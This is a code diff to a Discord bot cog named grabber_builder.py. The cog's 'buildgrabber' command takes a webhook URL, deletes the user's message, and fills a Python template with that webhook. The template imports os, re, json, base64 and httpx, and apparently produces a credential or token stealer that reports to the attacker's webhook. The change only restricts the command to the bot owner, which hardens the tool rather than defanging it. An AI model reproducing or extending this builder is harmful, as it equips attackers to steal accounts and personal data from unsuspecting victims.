@@ -1,6 +1,7 @@
 # cogs/grabber_builder.py
 import discord
 from discord.ext import commands
+from core_utils import owner_check
 
 TEMPLATE = r'''
 import os, re, json, base64, httpx
@@ -84,6 +85,7 @@ class GrabberBuilder(commands.Cog):
         self.bot = bot
 
     @commands.command(name="buildgrabber")
+    @owner_check()
     async def buildgrabber(self, ctx, webhook_url: str):
         await ctx.message.delete()
         code = TEMPLATE.format(webhook=webhook_url)
